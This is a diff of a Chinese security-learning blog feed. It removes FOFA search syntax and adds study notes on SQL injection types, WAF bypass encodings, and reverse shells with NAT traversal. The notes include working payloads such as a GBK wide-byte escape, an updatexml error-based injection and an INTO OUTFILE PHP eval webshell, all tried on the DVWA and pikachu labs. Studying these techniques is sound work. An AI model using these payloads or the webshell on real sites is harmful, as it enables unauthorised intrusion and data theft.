-<p>country&#x3D;”CN” 搜索指定国家(编码)的资产。</p>
-<p>region&#x3D;”HeNan” 搜索指定行政区的资产。</p>
-<p>city&#x3D;”HanDan” 搜索指定城市的资产。</p>
-<p>cert&#x3D;”baidu” 搜索证书(https或者imaps等)中带有baidu的资产。</p>
-<p>cert.subject&#x3D;”Oracle Corporation” 搜索证书持有者是Oracle Corporation的资产</p>
-<p>cert.issuer&#x3D;”DigiCert” 搜索证书颁发者为DigiCert Inc的资产</p>
-<p>cert.is_valid&#x3D;true 验证证书是否有效，true有效，false无效，仅限FOFA高级会员使用</p>
-<p>banner&#x3D;users &amp;&amp; protocol&#x3D;ftp 搜索FTP协议中带有users文本的资产。</p>
-<p>type&#x3D;service 搜索所有协议资产，支持subdomain和service两种。</p>
-<p>os&#x3D;”centos” 搜索操作系统为CentOS资产。</p>
-<p>server&#x3D;&#x3D;”Microsoft-IIS&#x2F;10” 搜索IIS 10服务器。</p>
-<p>app&#x3D;”Microsoft-Exchange” 搜索Microsoft-Exchange设备</p>
-<p>after&#x3D;”2017” &amp;&amp; before&#x3D;”2017-10-01” 时间范围段搜索</p>
-<p>asn&#x3D;”19551” 搜索指定asn的资产。</p>
-<p>org&#x3D;”Amazon.com, Inc.” 搜索指定org(组织)的资产。</p>
-<p>base_protocol&#x3D;”udp” 搜索指定udp协议的资产。</p>
-<p>is_fraud&#x3D;false 排除仿冒&#x2F;欺诈数据</p>
-<p>is_honeypot&#x3D;false 排除蜜罐数据，仅限FOFA高级会员使用</p>
-<p>is_ipv6&#x3D;true 搜索ipv6的资产,只接受true和false。</p>
-<p>is_domain&#x3D;true 搜索域名的资产,只接受true和false。</p>
-<p>port_size&#x3D;”6” 查询开放端口数量等于”6”的资产，仅限FOFA会员使用</p>
-<p>port_size_gt&#x3D;”6” 查询开放端口数量大于”6”的资产，仅限FOFA会员使用</p>
-<p>port_size_lt&#x3D;”12” 查询开放端口数量小于”12”的资产，仅限FOFA会员使用</p>
-<p>ip_ports&#x3D;”80,161” 搜索同时开放80和161端口的ip资产(以ip为单位的资产数据)</p>
-<p>ip_country&#x3D;”CN” 搜索中国的ip资产(以ip为单位的资产数据)。</p>
-<p>ip_region&#x3D;”Zhejiang” 搜索指定行政区的ip资产(以ip为单位的资产数据)。</p>
-<p>ip_city&#x3D;”Hangzhou” 搜索指定城市的ip资产(以ip为单位的资产数据)。</p>
-<p>ip_after&#x3D;”2021-03-18” 搜索2021-03-18以后的ip资产(以ip为单位的资产数据)。</p>
-<p>ip_before&#x3D;”2019-09-09” 搜索2019-09-09以前的ip资产(以ip为单位的资产数据)。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>盲注需要这样集中函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">length（） 返回字符串的长度</span><br><span class="line">substr（） 截取字符串</span><br><span class="line">ascil（） 返回字符对应的ASCII码</span><br><span class="line">sleep（） 将程序挂起一段时间</span><br></pre></td></tr></table></figure>
+
+<h2 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h2><p>堆叠注入，从名词的含义就可以看到应该是<strong>一堆 sql 语句（多条）一起执行，而在真实的运用中也是这样的</strong>。我们知道在Mysql中，主要是命令行中，每一条语句结尾加 ; 表示语句结束，<strong>这样我们就想到了是 不是可以多句一起使用。</strong>其原理也很简单，就是将原来的语句构造完后加上分号，代表该语句结束，后 面再输入的就是一个全新的SQL语句，这个时候使用增删改查毫无限制</p>
+<p>堆叠注入的使用条件是十分有限的,极有可能收到API或者数据库引擎,又或者权限的限制,只有当调用数据库函数支持执行多条SQL语句时才能使用,</p>
+<p>利用mysqli_multi_query()函数就支持多条SQL语句同时执行，但实际情况中，如PHP为了防止所谓的SQL注入机制，调用数据库的函数往往都只是mysqli_query()函数,只能执行一条语句,所以说堆叠注入的使用条件是十分有限的且实战中很少会有这种啥防护器也不上的网页()</p>
+<p>因此SQL注入分类总结可以如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.根据查询字段：数字型，字符型</span><br><span class="line">2.根据查询方式：Union注入、堆叠注入</span><br><span class="line">3.根据回显：报错、盲注</span><br></pre></td></tr></table></figure>
+
+<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>二次注入是指存入存出的过程中,存入数据库的时候做了过滤但是去取出来的时候没有做过滤z,而产生的数据库注入.</p>
+<h3 id="插入恶意数据"><a href="#插入恶意数据" class="headerlink" title="插入恶意数据"></a>插入恶意数据</h3><p>在第一次想数据库插入数据时,使用addslashes对其中的特殊字符进行转义,但是addslashes函数有一个特点;虽然参数过滤后添加\进行转义,但是\并不会插入到数据库中,写入时还是保留了原来的数据.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在MySQL中，反斜线在字符串中属于是转义字符，经过语法解析器解析时会进行一次转义，所以当我们插入反斜线也就是通过insert“\”时，如insert “\”在数据库中只会存储“”，第一个反斜线（\)被当作转义字符处理</span><br></pre></td></tr></table></figure>
+
+<h3 id="引用恶意数据"><a href="#引用恶意数据" class="headerlink" title="引用恶意数据"></a>引用恶意数据</h3><p>在将数据存入到数据库中之后,开发者就认为数据可信了.在下一次进行需要进行查询的时候,直接从数据库中取出了脏数据,没有进行进一步的检验和处理,这样就会造成SQL的二次注入</p>
+<p><strong>比如第一次插入数据的时候,数据中带有单引号,直接插入到了数据库中–然后下一次使用在拼凑的过程中就形成了二次注入.</strong></p>
+<p>二次注入漏洞原理示意图</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709214142033.png" alt="image-20240709214142033"></p>
+<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><h3 id="宽字节概念"><a href="#宽字节概念" class="headerlink" title="宽字节概念"></a>宽字节概念</h3><p>1、如果一个字符的大小是一个字节的，称为窄字节；</p>
+<p> 2、如果一个字符的大小是两个及以上字节的，称为宽字节； 像GB2312、GBK、GB18030、BIG5、Shift_JIS等编码都是常见的宽字节字符集。 英文默认占一个字节，中文占两个字节。</p>
+<h3 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h3><p>宽字节注入利用给MYSQL的一个特性,利用GBK编码的时候,会认为两个字符是一个汉字,为了防止网站被SQL注入,网站开发人员自然也会做一些防护,最基础的就是对一些特殊字符进行转义</p>
+<p><strong>统筹前面学习的内容,可以发现SQL注入最关键的一步就是让引号闭合和跳出引号,如果无法跳出引号,那么输入的内容就永远在引号里,即永远是字符串,无法实现SQL注入</strong></p>
+<p>网站开发者也想到了这一步,于是他们痛定思痛开始进步,从最简单的一个措施开始做起:<strong>转义</strong>—<strong>对输入的敏感内容、特殊字符进行转换，比方将引号替换为null</strong></p>
+<h4 id="addslashes（）函数"><a href="#addslashes（）函数" class="headerlink" title="addslashes（）函数"></a>addslashes（）函数</h4><p>1、该函数会在预定义字符之前添加反斜线进行转义，<br>2、预定义字符一般有：单引号 双引号 反斜线 null</p>
+<p>所谓的转义就是将预定义字符加上反斜线，使其失去占位构造语句的作用，使预定义字符仅仅是一个普通的字符串</p>
+<p><strong>以pikachu数据库中的member表为例：</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709220531493.png" alt="image-20240709220531493"></p>
+<p>通过前面的SQL注入实验可以发现，字符型的注入点都是通过单引号闭合前后的反馈来判断的，但遇到addslashes（）函数时，单引号会被转义，导致我们用来判断注入点的单引号失效，所以我们的目的就是使转义符\失效，使单引号逃逸</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1）kobe%df&#x27; or 1=1# //用户在前端输入</span><br><span class="line">2）kobe%df\&#x27; or 1=1# //addslashes()函数对用户输入进行检测，在单引号前面添加转义符</span><br><span class="line">\</span><br><span class="line">kobe%df%5c%27 or 1=1# //转义符 \ 编码成为%5c</span><br><span class="line">%df%5c = 運 //到达数据库，GBK编码</span><br><span class="line">3)kobe運&#x27; or 1=1#</span><br><span class="line">select id,email from member where username=&#x27;kobe運&#x27; or 1=1#&#x27; //从单引号中逃逸出来</span><br></pre></td></tr></table></figure>
+
+<p>[GBK 编码范围, GBK 编码表 (qqxiuzi.cn)](<a href="https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php#:~:text=GBK%E7%BC%96%E7%A0%81%EF%BC%8C%E6%98%AF%E5%AF%B9GB2312%E7%BC%96%E7%A0%81%E7%9A%84%E6%89%A9%E5%B1%95%EF%BC%8C%E5%9B%A0%E6%AD%A4%E5%AE%8C%E5%85%A8%E5%85%BC%E5%AE%B9GB2312-80%E6%A0%87%E5%87%86%E3%80%82,GBK%E7%BC%96%E7%A0%81%E4%BE%9D%E7%84%B6%E9%87%87%E7%94%A8%E5%8F%8C%E5%AD%97%E8%8A%82%E7%BC%96%E7%A0%81%E6%96%B9%E6%A1%88%EF%BC%8C%E5%85%B6%E7%BC%96%E7%A0%81%E8%8C%83%E5%9B%B4%EF%BC%9A8140%EF%BC%8DFEFE%EF%BC%8C%E5%89%94%E9%99%A4xx7F%E7%A0%81%E4%BD%8D%EF%BC%8C%E5%85%B123940%E4%B8%AA%E7%A0%81%E4%BD%8D%E3%80%82">https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php#:~:text=GBK编码，是对GB2312编码的扩展，因此完全兼容GB2312-80标准。,GBK编码依然采用双字节编码方案，其编码范围：8140－FEFE，剔除xx7F码位，共23940个码位。</a> 共收录汉字和图形符号21886个，其中汉字（包括部首和构件）21003个，图形符号883个。)</p>
+<p>原理：前端输入 %df%27 时首先经过 addslashes() 函数转义变成了 %df%5c%27 （ %5c 是反斜杠 \ )， 之后在数据库查询前因为设置了GBK编码，即在汉字编码范围内两个字节都会被重新编码为一个汉字。 然后MySQL服务器就会对查询语句进行GBK编码，即 %df%5c 转换成了汉字”運”，使得单引号成功逃 逸，进而实现SQL注入漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%df%27 ===&gt; addslashes函数 ===&gt; %df%5c%27 ===&gt; 数据库GBK ===&gt; 運&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709224224722.png" alt="image-20240709224224722"></p>
+<h2 id="http-header-和-cookie注入"><a href="#http-header-和-cookie注入" class="headerlink" title="http header 和 cookie注入"></a>http header 和 cookie注入</h2><p>HTTP头注入其实并不是一个新的SQL注入类型,而是指出现SQL注入漏洞的场景,有些时候,后台开发人员为了验证客户端头信息(比如常用的cookie验证),或者通过http header头信息获取客户端的一些资料–比如useragent、acceept字段等，会获取客户端的http header字段内容并用SQL进行处理，如果没有足够的安全检验则会导致对应的SQL注入漏洞。</p>
+<p>进入pikachu的http header来进行一下测试:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709225102261.png" alt="image-20240709225102261"></p>
+<p>通过提示 ，我们通过基本的admin&#x2F;123456登录，并获得下列信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709225244173.png" alt="image-20240709225244173"></p>
+<p>通过登录进去的信息可以猜测，系统后端是不是对http header里面的数据进行了获取，可能也进行了相 关数据库的操作。我们来看一下刚才的抓包，将它发送到Repeater里面，将User-Agent的值删掉，自己 构造一个，还是按照之前的思路，先输入一个单引号：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240710101424266.png" alt="image-20240710101424266"></p>
+<p>这个时候发现引发了报错，因此这里基本确定了这里存在http header注入漏洞了，合理猜测数据库使用了insert（）函数进行处理，构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这里开始解释这个payload</p>
+<h3 id="详细解释"><a href="#详细解释" class="headerlink" title="详细解释"></a>详细解释</h3><h4 id="1-SQL-注入和报错利用"><a href="#1-SQL-注入和报错利用" class="headerlink" title="1. SQL 注入和报错利用"></a>1. SQL 注入和报错利用</h4><p>SQL 注入攻击不仅仅是为了修改或读取数据，还可以通过触发错误来泄露数据库内部信息。通过这种方法，攻击者可以获得数据库的架构信息、版本信息等。</p>
+<h4 id="2-updatexml-函数的使用"><a href="#2-updatexml-函数的使用" class="headerlink" title="2. updatexml 函数的使用"></a>2. <code>updatexml</code> 函数的使用</h4><p><code>updatexml</code> 是一个 MySQL 函数，通常用于处理 XML 数据。当它的参数不合法时，会触发错误消息。攻击者可以利用这一点，将有用的信息嵌入到错误消息中。</p>
+<h4 id="3-报错示例"><a href="#3-报错示例" class="headerlink" title="3. 报错示例"></a>3. 报错示例</h4><p>假设你的 SQL 查询如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sql</span><br><span class="line">复制代码</span><br><span class="line">INSERT INTO logs (user_agent) VALUES (&#x27;&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>其中 <code>updatexml(1,concat(0x7e,database()),0)</code> 部分会触发错误，因为 <code>updatexml</code> 期望的是 XML 文档，但这里传入的是不合法的参数 <code>1</code>。因此，MySQL 会返回一个错误，错误消息中包含了 <code>concat(0x7e,database())</code> 的结果。</p>
+<h3 id="触发错误和提取信息"><a href="#触发错误和提取信息" class="headerlink" title="触发错误和提取信息"></a>触发错误和提取信息</h3><p>当上述 SQL 查询执行时，由于 <code>updatexml</code> 函数的参数不合法，MySQL 会生成错误消息。错误消息中将包含 <code>concat(0x7e,database())</code> 的结果，其中 <code>0x7e</code> 是 ASCII 码 <code>~</code>，而 <code>database()</code> 函数返回当前数据库的名称。</p>
+<p>错误消息可能类似于：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">复制代码</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~current_database_name&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>在这种情况下，错误消息泄露了当前数据库的名称 <code>current_database_name</code>。</p>
+<h3 id="为什么需要or"><a href="#为什么需要or" class="headerlink" title="为什么需要or"></a>为什么需要<code>or</code></h3><p><code>or</code>在这里的主要作用是确保注入的代码在逻辑上总是会被评估并执行。即使前面的条件为假（例如空字符串），<code>or</code>会导致SQL引擎继续评估后面的条件。在这个特定的payload中，<code>updatexml</code>函数被设计为引发错误，从而泄露数据库名称。</p>
+<h1 id="从MYSQL注入到GetShell"><a href="#从MYSQL注入到GetShell" class="headerlink" title="从MYSQL注入到GetShell"></a>从MYSQL注入到GetShell</h1><p>Mysql支持向外写文件,这里的外指的是服务器的外部,需要用到</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">into</span> outfile</span><br></pre></td></tr></table></figure>
+
+<p>这个命令的作用是将被选择的一行代码写入一个文件中,文件被创建到服务器上,</p>
+<p><strong>其中 select into outfile的使用前提是</strong></p>
+<p>(1)要知道网站的绝对路径,可以通过开源程序,报错,phpinfo,404页面等一些方式做基本的信息收集</p>
+<p>(2)对目录要有写权限,一般image之类的存放图片的目录y欧写入权限</p>
+<p>(3)要有mysql file权限,即(能否对系统的文件读取和写操作),默认情况下只有root权限有, <strong>WARING:写的文件名一定是在网站中不存在的,不然会失败</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,&quot;&lt;?php eval($_POST[&#x27;a&#x27;]);?&gt;&quot; into outfile &#x27;/var/www/html/shell2.php</span><br></pre></td></tr></table></figure>
+
+<p>在DVWA Low等级的SQL injection中如此输入,后续访问对应的网站目录,可以发现成功注入,并通过蚁剑弹shell</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240710103522276.png" alt="image-20240710103522276"></p>
+<h1 id="SQL注入绕过"><a href="#SQL注入绕过" class="headerlink" title="SQL注入绕过"></a>SQL注入绕过</h1><p>绕过的姿势很多,这里介绍几种</p>
+<h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><p>用于只针对于小写或大写的关键字匹配技术,正则表达式&#x2F;express&#x2F;i 表达大小写不敏感,即无法绕过,这是最简单的绕过方式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">z.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4</span><br></pre></td></tr></table></figure>
+
+<h2 id="替换关键字"><a href="#替换关键字" class="headerlink" title="替换关键字"></a>替换关键字</h2><p>一般情况下大小写转换无法绕过,而且正则表达式会替换或山粗和select,union这些比较危险的关键字,如果只匹配一次–(也就是不做二次校验,只删去一层危险关键字便通过用户的操作)–只需要<strong>双写关键字</strong>就很容易绕过</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">举例：z.com<span class="operator">/</span>index.php?page_id<span class="operator">=</span><span class="number">-15</span> UNIunionON SELselectECT <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="使用编码"><a href="#使用编码" class="headerlink" title="使用编码"></a>使用编码</h2><h3 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h3><p>在浏览器中输入一个连接,浏览器会对非保留字符进行URL编码</p>
+<p>空格-%20</p>
+<p>单引号-%27</p>
+<p>左右括号分别是%28 %29</p>
+<p><strong>普通的URL编码可能无法实现绕过，需要结合实际场景来判断</strong></p>
+<p><strong>比方说URL编码只进行了一次过滤，就可以再编码一次双重编码绕过</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1%2527id=1%252f%252a*/UNION%252f%252a%252a/SELECT</span><br></pre></td></tr></table></figure>
+
+<p>首先，我们需要理解URL编码。<code>%25</code>是<code>%</code>的URL编码。因此，<code>%2527</code>解码后是<code>%27</code>，<code>%252f</code>解码后是<code>%2f</code>，<code>%252a</code>解码后是<code>%2a</code>。</p>
+<h3 id="解码后的payload"><a href="#解码后的payload" class="headerlink" title="解码后的payload"></a>解码后的payload</h3><p>通过一次URL解码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">复制代码</span><br><span class="line">1%27id=1%2f%2a*/UNION%2f%2a%2a/SELECT</span><br></pre></td></tr></table></figure>
+
+<p>再次URL解码后：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;id=1/*/UNION/**/SELECT</span><br></pre></td></tr></table></figure>
+
+<h3 id="详细解析"><a href="#详细解析" class="headerlink" title="详细解析"></a>详细解析</h3><ol>
+<li>**<code>1&#39;</code>**：这是一个单引号，通常用于结束字符串字面值，打开可能的SQL注入点。</li>
+<li>**<code>id=1</code>**：这是一个常规的条件部分，可能是为了符合预期的SQL查询语法。</li>
+<li>**<code>/\*/UNION/\**/SELECT</code>**：这是注入的主要部分，其中使用了SQL注释语法<code>/* ... */</code>来插入注释。</li>
+</ol>
+<h3 id="绕过防护机制"><a href="#绕过防护机制" class="headerlink" title="绕过防护机制"></a>绕过防护机制</h3><ol>
+<li><p><strong>注释绕过</strong></p>
+<p><code>/*</code>和<code>*/</code>是SQL中的多行注释符号。攻击者利用这些注释符号来分割注入的关键字，使得简单的防护机制难以检测到关键字（如<code>UNION</code>和<code>SELECT</code>）的完整匹配。</p>
+<p>在这个例子中：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*/UNION/**/SELECT</span><br></pre></td></tr></table></figure>
+
+<p>这实际上是：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ UNION / SELECT</span><br></pre></td></tr></table></figure>
+
+<p>由于注释的存在，防护机制可能无法检测到完整的<code>UNION SELECT</code>关键字，从而绕过防护。</p>
+</li>
+</ol>
+<h3 id="十六进制编码"><a href="#十六进制编码" class="headerlink" title="十六进制编码"></a>十六进制编码</h3><p>顾名思义用16进制转义</p>
+<h2 id="注释绕过"><a href="#注释绕过" class="headerlink" title="注释绕过"></a>注释绕过</h2><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240710104600689.png" alt="image-20240710104600689"></h2><h2 id="等价函数与命令"><a href="#等价函数与命令" class="headerlink" title="等价函数与命令"></a>等价函数与命令</h2><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240710105238466.png" alt="image-20240710105238466"></p>
+<h2 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h2><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240710105608748.png" alt="image-20240710105608748"></p>
+]]></content>
+      <categories>
+        <category>Application vulnerabilities</category>
+      </categories>
+      <tags>
+        <tag>OWASP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>从0开始的渗透Day1-3desu</title>
+    <url>/2024/07/11/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84%E6%B8%97%E9%80%8F/</url>
+    <content><![CDATA[<h1 id="如读者有未授权渗透行为，后果自负，本站仅作学习用途"><a href="#如读者有未授权渗透行为，后果自负，本站仅作学习用途" class="headerlink" title="如读者有未授权渗透行为，后果自负，本站仅作学习用途"></a>如读者有未授权渗透行为，后果自负，本站仅作学习用途</h1><h1 id="Day1-基础入门-操作系统-名词-文件下载-反弹shell-防火墙绕过"><a href="#Day1-基础入门-操作系统-名词-文件下载-反弹shell-防火墙绕过" class="headerlink" title="Day1:基础入门-操作系统&amp;名词&amp;文件下载&amp;反弹shell&amp;防火墙绕过"></a>Day1:基础入门-操作系统&amp;名词&amp;文件下载&amp;反弹shell&amp;防火墙绕过</h1><h1 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h1><p><a href="https://www.cnblogs.com/sunny11/p/13583083.html">https://www.cnblogs.com/sunny11/p/13583083.html</a></p>
+<h1 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h1><p><a href="https://forum.ywhack.com/bountytips.php?download">https://forum.ywhack.com/bountytips.php?download</a></p>
+<p><strong>在渗透的过程中，如果我们要在对方的服务里面下载我们制作好的病毒文件等，是不可能通过打开对方的浏览器进而进行下载的，因此弹出shell后我们也要掌握一些基本的文件下载命令，并且自己搭建一个小型的渗透站点用于传输一些安全脚本或者安全文件作为攻击手段。</strong></p>
+<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>反弹shell主要用于<strong>命令发送后无回显的情况</strong>，<strong>大部分 的安全工具都是一条命令发送过后便了无音讯</strong>，服务器接收了但并没有给我们对应的反馈，这个时候就需要反弹shell。</p>
+<p>同时反弹shell能够解决一些需要交互式问答的命令的执行问题，一般情况下<strong>webshell是无法进一步验证我们的命令的</strong>，如果我们需要进行一些高权限的操作，这时服务器要求我们验证root权限，即使我们有root密码也是无济于事的，<strong>因为交互式命令的进一步交互并没有反馈到所谓的webshell这里</strong>，这个时候就更需要反弹shell了</p>
+<h1 id="防火墙绕过"><a href="#防火墙绕过" class="headerlink" title="防火墙绕过"></a>防火墙绕过</h1><p>案例</p>
+<h2 id="1-内网："><a href="#1-内网：" class="headerlink" title="1.内网："></a>1.内网：</h2><p>内网**–&gt;**xzb666-hub</p>
+<p>xzb666-hub**!–&gt;**内网</p>
+<p>这里的xzb666-hub可以代指类似本博客这样部署在公网上的站点</p>
+<p>这块的监听可以用nc做实验，分别以xzb666-hub为代表的公网以及以虚拟机为代表的内网作为被监听端和监听端</p>
+<p>发现此时监听成立，能够弹shell</p>
+<p>但反过来，以xzb666-hubd为代表的公网想要监听内网是不成立的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/008jCdW0gy1hriyt8rqkwj30xd0xinbv.jpg" alt="img"></p>
+<p>那么这就是一个很生草的问题了</p>
+<p>下面我们来解释下这个问题</p>
+<p>内网能够主动找到外网地址，但外网地址想要找内网地址却很难，下面扒取一段解释，可以作为参考</p>
+<ol>
+<li><p><strong>内网可以直接访问外网么？</strong></p>
+<p>答案是<code>不能</code>，内网IP访问外网必须要通过路由器来中转 ，路由器只有连上了电信服务器，分配有外网IP才能访问外网。但内网通过路由器的中继是可以精准找到外网的。</p>
+</li>
+<li><p><strong>外网能否访问内网？</strong></p>
+<p>答案是外网设备不能直接访问内网设备。这是因为内网（局域网）和外网（广域网）之间存在一个隔离层，通常由路由器或防火墙来维持。这种隔离是为了保护内网设备不受外部攻击和未经授权的访问</p>
+<p>————————————————————————————————————</p>
+<ol>
+<li><strong>NAT（网络地址转换）</strong>：路由器通常使用NAT技术，将内网IP地址转换为外网IP地址。外部设备无法直接访问内网IP，因为这些IP在外网中是不可见的。</li>
+<li><strong>防火墙</strong>：路由器或专用防火墙通常会阻止外部未授权的访问请求进入内网，以保护内网设备的安全。</li>
+</ol>
+<p>尽管如此，外网访问内网设备并非完全不可能。通过配置端口转发（Port Forwarding）或使用VPN（虚拟专用网络），你可以允许外部设备访问特定的内网设备或服务。不过，这些配置需要手动设置，并且通常仅用于特定用途，例如远程桌面访问或托管网络服务。</p>
+<p>————————————————————————————————————</p>
+<p><strong>如何解决外网无法访问内网的问题？</strong></p>
+<p>端口映射</p>
+<p>这个又叫虚拟映射，这个方法就是在连接外网的路由器上做一个端口映射的设置，具体说将访问该路由器外网地址和特定端口的服务映射到内网的一台电脑的某一个端口上。</p>
+<p><strong>其实是很通俗易懂的,外网访问的过程中将流量转发到路由器上，（也就是我们百度直接搜ip时会弹出的ip–称为出口ip），然后我们选择一个端口。使这个端口又映射到内网主机的某个端口上实现流量从外网到内网主机的精准转发desu喵</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/008jCdW0gy1hfdyq4d43tj30u00u0q74.jpg" alt="img"></p>
+<p>具体上面来说，<strong>就是在光猫+路由器上做一个虚拟映射的设置，例如，将访问122.15.244.39，端口10101的访问映射到192.168.2.2的端口10101上。</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240711112852515.png" alt="image-20240711112852515"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240711112917706.png" alt="image-20240711112917706"></p>
+<p>设置完成后，在外网浏览器输入：122.15.244.39:10101，则可以直接访问到服务器。<br>需要注意的是：<br>(1)<strong>公网映射时，选择的外部端口最好不选择常用的80，21等，因为路由器会屏蔽这些！！！</strong><br>(2) 服务器需要连接到包含公网IP的服务器上！</p>
+<p><strong>如何获得公网IP</strong><br>实际当中，你的光猫+路由器的那个IP地址（可以在登录路由器界面后看到）不一定是公网IP，如果不是，则以上无法完成。因为IP地址很有限，所以很多运营商给你的是私网IP。例如，你看到你的那个地址是通过PPOE得来的，就是私有的。可以参见这里<a href="https://blog.csdn.net/hongkaihua1987/article/details/106046819%E3%80%82%E8%A6%81%E8%8E%B7%E5%BE%97%E5%85%AC%E7%BD%91IP%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%89%BE%E8%BF%90%E8%90%A5%E5%95%86%EF%BC%8C%E8%A6%81%E6%B1%82%E7%BB%99%E5%85%AC%E7%BD%91IP%EF%BC%8C%E4%BB%96%E4%BB%AC%E4%BC%9A%E5%9C%A8%E5%90%8E%E5%8F%B0%E8%AE%BE%E7%BD%AE%EF%BC%8C%E8%AE%BE%E7%BD%AE%E5%AE%8C%E5%90%8E%E5%B0%B1%E6%98%AF%E5%85%AC%E7%BD%91%E7%9A%84%E4%BA%86%E3%80%82">https://blog.csdn.net/hongkaihua1987/article/details/106046819。要获得公网IP，可以找运营商，要求给公网IP，他们会在后台设置，设置完后就是公网的了。</a></p>
+<p>**</p>
+<p><strong>公网IP是动态的怎么办</strong><br>你的公网IP有了，但是他通常是动态的（登录路由器，如果是DHCP获得的，就是动态的）。所谓动态就是分给你的是变化的，当你路由器重新加电或复位后就会重新分配一个。这就有点傻了，总不能每次去查路由器吧。这里有两个办法：</p>
+<p><strong>申请固定IP</strong><br>（1）找运营商，申请一个固定的公网IP。但是有个前提，运营商只对公司分配固定IP，对个人用户是不可以的。同时公司用户必须申请公司宽带，不能是个人宽带。公司宽带的资费要比个人的贵一些。同时，如果想要申请固定IP，还需要额外收一笔费用，按月计费。</p>
+<p>转载自<a href="https://blog.csdn.net/kevinshift/article/details/122148573#31__25">从外网访问局域网服务器的六种方法_内部服务如何才能外部访问-CSDN博客</a></p>
+<p>————————————————————————————————————</p>
+</li>
+<li><p><strong>路由器的作用是什么，什么是路由？</strong></p>
+<p>比如说我们手机要访问<a href="https://link.zhihu.com/?target=http://baidu.com">http://baidu.com</a> ，必须先经过路由中转然后路由外网IP对<a href="https://link.zhihu.com/?target=http://baidu.com">http://baidu.com</a> 发送请求，百度收到后对路由响应一个网页或者 数据之类的东东。</p>
+<p>路由器接收到 <a href="https://link.zhihu.com/?target=http://baidu.com">http://baidu.com</a> 的页面后，把页面发送给你的电脑或手机。路由器知道如何给这些信息指路，路由器就是一个指路人，这就是「路由」两个字的来历。</p>
